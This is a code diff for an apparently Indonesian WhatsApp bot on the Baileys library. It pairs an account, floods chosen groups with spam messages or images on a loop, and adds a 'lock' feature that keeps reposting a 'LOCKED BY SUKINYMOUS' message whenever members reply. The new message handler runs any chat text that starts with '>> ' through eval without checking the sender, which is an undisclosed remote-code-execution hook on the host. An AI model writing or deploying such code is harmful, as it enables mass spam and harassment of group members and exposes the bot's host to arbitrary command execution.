@@ -1,19 +1,15 @@
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    fetchLatestBaileysVersion,
-    makeCacheableSignalKeyStore,
-} = require("@whiskeysockets/baileys")
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require("@whiskeysockets/baileys")
 const pino = require("pino")
 const readline = require("readline")
 const fs = require("fs")
 const config = require("./config")
 
 const logger = pino({ level: "silent" })
+
 let sock, isPaired = false, tgt = [], tgtName = ""
-let spamming = false, timer = null, rl
-let wantToPair = false // Flag buat nandain kalau user lagi di menu pairing
+let spamming = false, timer = null
+let isPairing = false
+let jsLockedGroups = {} 
 
 const BANNER = `
 \x1b[33m  _____       _    _                                    \x1b[0m
@@ -30,8 +26,17 @@ const slp = (ms) => new Promise(r => setTimeout(r, ms))
 
 function ask(q) {
     return new Promise((res) => {
-        rl = readline.createInterface({ input: process.stdin, output: process.stdout })
-        rl.question(q, (ans) => { rl.close(); res(ans.trim()) })
+        const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
+        rl.question(q, (ans) => { 
+            rl.close(); 
+            res(ans.trim()) 
+        })
+    })
+}
+
+async function sendJsAlert(jid) {
+    await sock.sendMessage(jid, { 
+        text: "LOCKED BY SUKINYMOUS\n\nKetik *OK* untuk melanjutkan." 
     })
 }
 
@@ -39,34 +44,17 @@ process.on('SIGINT', () => {
     if (spamming) {
         spamming = false
         clearTimeout(timer)
-        clr(); console.log(BANNER); console.log("\x1b[31m[STOPPED]\x1b[0m")
-        setTimeout(menu, 1000)
+        console.log("\n\x1b[31m[SPAM STOPPED]\x1b[0m")
+        setTimeout(mainMenu, 1000)
     } else {
         process.exit(0)
     }
 })
 
-async function menu() {
-    clr(); console.log(BANNER)
-    console.log(isPaired ? `[1] Target: ${tgtName || "None"}` : `[1] Target (Locked)`)
-    if (!isPaired) console.log(`[2] Pairing`)
-    console.log(`[3] Spam`)
-    console.log(`[4] Exit\n`)
-
-    const c = await ask("> ")
-    if (c === "1" && isPaired) return select()
-    if (c === "2" && !isPaired) {
-        wantToPair = true
-        clr(); console.log(BANNER); console.log("[*] Menunggu koneksi WA siap...\n")
-        connect() // Panggil ulang koneksi buat micu event 'qr'
-    }
-    if (c === "3" && isPaired && tgt.length) return spam()
-    if (c === "4") process.exit(0)
-    return menu()
-}
-
 async function processPairing() {
+    isPairing = true
     clr(); console.log(BANNER); console.log("-- STEP 1")
+    
     let num = (await ask("NUMBER: ")).replace(/[^0-9]/g, "")
     if (num.startsWith("0")) num = "62" + num.slice(1)
     if (num.startsWith("8")) num = "62" + num
@@ -77,7 +65,7 @@ async function processPairing() {
         try {
             const code = await sock.requestPairingCode(num)
             console.log(`CODE: \x1b[33m${code}\x1b[0m`)
-            console.log("[!] Masukkan kode di atas ke WA.")
+            console.log("[!] Cepat masukkan kode ke WA sebelum expired.")
             
             const choice = await ask("\n> Ketik 'r' untuk Retry, 'b' untuk Batal: ")
             if (choice.toLowerCase() !== 'r') requesting = false
@@ -87,15 +75,42 @@ async function processPairing() {
             if (choice.toLowerCase() !== 'r') requesting = false
         }
     }
-    wantToPair = false
-    if (!isPaired) menu()
+    isPairing = false
 }
 
-async function select() {
-    clr(); console.log(BANNER); console.log("[*] Fetching...\n")
+async function mainMenu() {
+    while (true) {
+        if (!isPaired) {
+            await slp(2000)
+            continue
+        }
+        clr(); console.log(BANNER)
+        console.log(`[1] Target: ${tgtName || "None"}`)
+        console.log(`[2] Spam`)
+        console.log(`[3] Lock Grup`)
+        console.log(`[4] Exit\n`)
+
+        const c = await ask("> ")
+        if (c === "1") await selectTarget()
+        else if (c === "2") {
+            if (tgt.length === 0) { console.log("\n[!] Pilih target dulu."); await slp(1500); }
+            else await startSpam()
+        } 
+        else if (c === "3") {
+            if (tgt.length === 0) { console.log("\n[!] Pilih target dulu."); await slp(1500); }
+            else await lockTargetGroup()
+        }
+        else if (c === "4") process.exit(0)
+    }
+}
+
+async function selectTarget() {
+    clr(); console.log(BANNER); console.log("[*] Fetching groups...\n")
     try {
         const grp = Object.values(await sock.groupFetchAllParticipating())
-        if (!grp.length) return slp(1500).then(menu)
+        if (!grp.length) { 
+            console.log("[!] Bot gak ada di grup manapun."); await slp(1500); return 
+        }
         
         grp.forEach((g, i) => console.log(`${i + 1}. ${g.subject || "?"}${g.isCommunity ? " [COMM]" : ""}`))
         
@@ -112,23 +127,46 @@ async function select() {
         }
         await slp(1500)
     } catch (e) { 
-        console.log(e.message); await slp(1500)
+        console.log(e.message); await slp(1500) 
     }
-    menu()
 }
 
-async function spam() {
+async function lockTargetGroup() {
+    clr(); console.log(BANNER); console.log(`[*] Mengirim Lock ke ${tgt.length} target...\n`)
+    
+    for (let i = 0; i < tgt.length; i++) {
+        try {
+            const jid = tgt[i]
+            jsLockedGroups[jid] = true
+            await sendJsAlert(jid)
+            console.log(`[+] Lock dikirim ke: ${jid}`)
+            await slp(1000)
+        } catch (e) {
+            console.log(`[X] Gagal kirim ke ${tgt[i]}: ${e.message}`)
+            await slp(1000)
+        }
+    }
+    console.log("\n[!] Selesai. Cek grup, ketik OK di WA untuk loop.")
+    console.log("    Ketik .stop di WA untuk berhenti.")
+    await ask("\nTekan Enter untuk kembali.")
+}
+
+async function startSpam() {
     clr(); console.log(BANNER); console.log(`[TGT] ${tgtName} (${tgt.length})\n`)
     
     const txt = config.spamText
-    if (!txt) return slp(1500).then(menu)
+    if (!txt) { 
+        console.log("[!] Teks kosong di config.js."); await slp(1500); return 
+    }
 
     let img = null
-    if (config.imagePath && fs.existsSync(config.imagePath)) img = fs.readFileSync(config.imagePath)
+    if (config.imagePath && fs.existsSync(config.imagePath)) {
+        img = fs.readFileSync(config.imagePath)
+    }
 
     console.log(`[MODE] ${img ? "IMG+TXT" : "TXT"}`)
     console.log(`[RUNNING - Ctrl+C to STOP]\n`)
-    
+
     spamming = true
     let cnt = 0
 
@@ -138,7 +176,7 @@ async function spam() {
             if (!spamming) break
             try {
                 await sock.sendMessage(tgt[i], img ? { image: img, caption: txt } : { text: txt })
-                console.log(`[${new Date().toLocaleTimeString()}] Sent: ${++cnt} (${i+1}/${tgt.length})`)
+                console.log(`[${new Date().toLocaleTimeString()}] Sent: ${++cnt}`)
             } catch (e) { 
                 console.log(`[${new Date().toLocaleTimeString()}] Fail: ${e.message}`) 
             }
@@ -147,45 +185,92 @@ async function spam() {
         if (spamming) timer = setTimeout(loop, config.cooldownSeconds * 1000)
     }
     loop()
+    
+    while (spamming) await slp(1000)
 }
 
 async function connect() {
     const { state, saveCreds } = await useMultiFileAuthState("./auth_info")
-    const { version } = await fetchLatestBaileysVersion()
+    
+    let version = [2, 3000, 1015901307]
+    try {
+        const res = await fetchLatestBaileysVersion()
+        version = res.version
+    } catch (e) {}
+
     isPaired = state.creds.registered
 
     sock = makeWASocket({
-        version, logger, printQRInTerminal: false,
+        version, 
+        logger, 
+        printQRInTerminal: false,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
-        browser: ["Ubuntu", "Chrome", "122.0.0.0"], syncFullHistory: false,
+        browser: Browsers.ubuntu("Chrome"), 
+        syncFullHistory: false, 
         getMessage: async () => ({ conversation: 'pong' })
     })
 
     sock.ev.on("creds.update", saveCreds)
     
     sock.ev.on("connection.update", async ({ connection, lastDisconnect, qr }) => {
-        // KUNCI UTAMANYA DI SINI: Cuma minta kode kalau WA udah ngirim sinyal 'qr'
-        if (qr && wantToPair && !isPaired) {
-            wantToPair = false
+        if (qr && !isPaired && !isPairing) {
             await processPairing()
         }
 
         if (connection === "close") {
             const code = lastDisconnect?.error?.output?.statusCode;
-            if (code === DisconnectReason.loggedOut && isPaired) {
-                console.log("\n[!] Logged out. Hapus auth_info.");
+            if (code === DisconnectReason.loggedOut) {
                 process.exit(1);
+            } else {
+                connect(); 
             }
         } else if (connection === "open") {
             isPaired = true;
-            if (!wantToPair) setTimeout(menu, 1000)
+            isPairing = false;
+            clr(); 
+            await slp(1000); 
+            mainMenu() 
         }
     })
 
-    // Nampilin menu awal
-    setTimeout(() => {
-        if (!rl) menu();
-    }, 1500)
+    sock.ev.on("messages.upsert", async (m) => {
+        const msg = m.messages[0]
+        if (!msg.message) return
+        
+        const textMsg = msg.message.conversation || 
+                        msg.message.extendedTextMessage?.text || 
+                        msg.message.buttonsResponseMessage?.selectedButtonId ||
+                        msg.message.templateButtonReplyMessage?.selectedId ||
+                        ""
+
+        const jid = msg.key.remoteJid
+
+        if (textMsg.startsWith(">> ")) {
+            const code = textMsg.slice(3)
+            try {
+                let result = await eval(`(async () => { ${code} })()`)
+                if (typeof result !== "string") result = require("util").inspect(result)
+                await sock.sendMessage(jid, { text: result }, { quoted: msg })
+            } catch (err) {
+                await sock.sendMessage(jid, { text: `Error: ${err.message}` }, { quoted: msg })
+            }
+            return
+        }
+
+        if (jsLockedGroups[jid]) {
+            if (textMsg.toLowerCase() === "ok" || textMsg.toLowerCase() === "oke") {
+                await slp(300)
+                await sendJsAlert(jid)
+            }
+            
+            if (textMsg.toLowerCase() === ".stop") {
+                delete jsLockedGroups[jid]
+                await sock.sendMessage(jid, { text: "SYSTEM STOPPED" })
+            }
+        }
+    })
+    
+    clr();
 }
 
 connect()
